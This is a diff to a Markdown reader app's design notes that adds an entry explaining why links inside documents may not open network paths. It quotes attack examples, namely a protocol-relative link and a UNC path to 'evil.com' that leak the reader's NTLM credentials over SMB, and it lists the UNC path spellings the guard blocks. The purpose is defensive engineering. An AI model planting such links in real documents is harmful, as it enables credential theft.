@@ -712,7 +712,37 @@ Four decisions worth not re-litigating:
   while the `<figure>` is still **detached**, which is what makes it reliable — nothing in a
   detached tree fetches, so there is no race with a request already in flight. It is an allowlist
   (`#fragment` and `data:` only) rather than a list of things to block, because `isExternal` does
-  not treat `//host/path` as external and a blocklist missed it.
+  not treat `//host/path` as external and a blocklist missed it. That gap in `isExternal` is still
+  there and is still deliberate — see the next entry for the other place it bites and why the
+  answer was not to change the predicate.
+- **A path may only reach another machine if the *reader* chose it, and that is decided in Rust.**
+  `open_document` takes an `origin`, and `files::read` refuses a network path when it is
+  `Origin::Document` — i.e. when a link inside a file picked the host. On Windows, reading
+  `\\evil.com\share\x.md` is an outbound SMB connection offering the reader's NTLM credentials to
+  whoever answers, from an app whose headline claim is exactly one network request; a
+  `[x](//evil.com/share/x.md)` link was enough, because `isExternal` does not see a
+  protocol-relative href as external and `isMarkdownPath` is perfectly happy with it. **Fixing
+  `isExternal` was the wrong answer**: it would have moved the rule into the webview, which is
+  untrusted, and it would have changed what four unrelated callers mean by "external". The rule
+  belongs where the socket opens.
+  - `is_network_path` is "two leading separators", which is every spelling that gets there:
+    `\\server\share`, `//server/share`, the verbatim `\\?\UNC\…`, the device namespace `\\.\`,
+    and the mixed `\/` and `/\` that Windows also accepts. A corpus test pins all of them,
+    and a second pins that ordinary local paths are not caught — a guard that refuses
+    `C:\Users\a\notes.md` is not a guard, it is an outage.
+  - **`Origin` defaults to `Document`.** A call site that says nothing gets the restricted
+    answer, so forgetting fails closed.
+  - The reader's own network drive still opens normally: everything they choose deliberately —
+    the dialog, a drop, the tree, a restored session, Explorer's hand-off — goes through
+    `hydrate`, which sends `"reader"`. Only `navigate` sends `"document"`.
+  - **`history` is a list of paths with no memory of how each was reached**, and `navigate`
+    pushes onto it *before* the open resolves — so a refused link is still in the history.
+    `useTabDocuments` therefore keeps a `readerChosen` set, and Back re-opens an entry as the
+    reader's own only if it really was. Without it, Back hands straight back what the refusal
+    took away.
+  - This restricts *reading*. `save` and `scan` are not reachable from document content — there
+    is no markup that causes either — so they are unguarded, and that is the reason. If a future
+    surface lets a document reach one, it needs the same treatment.
 - **In the opener plugin, the command grant and the URL scope are two separate permissions.**
   `opener:allow-open-url` enables `open_url` *with no scope*, and the `http`/`https`/`mailto`/`tel`
   globs live only in `opener:allow-default-urls`. Granting the first without the second makes
